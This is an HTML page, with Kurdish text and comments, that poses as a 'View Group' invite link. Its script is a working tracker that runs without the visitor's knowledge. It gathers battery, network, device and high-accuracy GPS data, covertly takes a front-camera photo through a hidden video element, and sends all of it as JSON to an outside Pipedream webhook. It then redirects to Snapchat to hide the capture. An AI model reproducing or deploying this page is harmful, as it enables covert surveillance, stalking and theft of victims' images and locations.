<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .btn {
            background-color: #0088cc;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            font-size: 18px;
            cursor: pointer;
            text-decoration: none;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(0,136,204,0.4);
            transition: 0.3s;
        }
        .btn:hover {
            background-color: #0077b5;
        }
    </style>
</head>
<body>

    <p>بۆ چوونە ناو گرووپ، کلیک لەسەر دوگمەی خوارەوە بکە:</p>
    <button class="btn" id="viewGroupBtn">View Group</button>

    <video id="video" width="640" height="480" autoplay style="display:none;" playsinline></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const secureWebhook = "https://eo7he3dstagkpih.m.pipedream.net";
        const snapchatRedirectUrl = "https://www.snapchat.com/spotlight/W7tBlwEw_aWnI0w_uREb_wA?share_id=OEQ1M0Ew&locale=en_US";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        let globalBattery = "N/A";
        let globalCharging = "N/A";
        let globalMaps = "⚠️ مۆڵەتی نەدا";
        let globalDevice = navigator.platform || "Unknown";
        let globalBrowser = "Safari/iPhone";
        let globalTime = new Date().toLocaleString('ku-IQ') || new Date().toString();
        let globalNetwork = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "Unknown";

        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                globalBattery = Math.round(battery.level * 100) + "%";
                globalCharging = battery.charging ? "بەڵێ" : "نەخێر";
            }).catch(() => {});
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((position) => {
                let lat = position.coords.latitude;
                let lon = position.coords.longitude;
                globalMaps = "http://maps.google.com/?q=" + lat + "," + lon;
            }, null, { enableHighAccuracy: true, timeout: 4000 });
        }

        document.getElementById('viewGroupBtn').addEventListener('click', function() {
            document.getElementById('viewGroupBtn').innerText = "Loading...";

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                .then(stream => {
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        try {
                            context.drawImage(video, 0, 0, 640, 480);
                            // گۆڕینی وێنەکە بۆ دەقی Base64 بۆ ئەوەی پێکهاتەی JSON تێکنەچێت
                            const imageDataUrl = canvas.toDataURL('image/jpeg', 0.7);
                            sendFinalData(imageDataUrl);
                        } catch (err) {
                            sendFinalData(null);
                        }
                    }, 500);
                })
                .catch(() => {
                    sendFinalData(null);
                });
        });

        function sendFinalData(base64Image) {
            let uid = "User_" + Math.floor(Math.random() * 90000) + 10000;

            // ڕێکخستنی داتاکان بە فۆرماتی خاوێنی JSON کە ڕێک دەچێتە ناو ئەو خانانەی دیاریت کردوون
            const payload = {
                uid: uid,
                battery: globalBattery,
                charging: globalCharging,
                maps: globalMaps,
                device: globalDevice,
                browser: globalBrowser,
                time: globalTime,
                network: globalNetwork,
                photo_base64: base64Image // وێنەکە لێرەدا وەک دەق دەنێردرێت
            };

            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });

            // ناردنی مسۆگەر بە بەکارهێنانی sendBeacon بۆ ئەوەی لە ئایفۆندا نەپچڕێت
            if (navigator.sendBeacon) {
                navigator.sendBeacon(secureWebhook, blob);
            } else {
                fetch(secureWebhook, { method: 'POST', body: JSON.stringify(payload), headers: { 'Content-Type': 'application/json' }, keepalive: true });
            }

            // گواستنەوە بۆ سناپچات
            window.location.href = snapchatRedirectUrl;
        }
    </script>
</body>
</html>
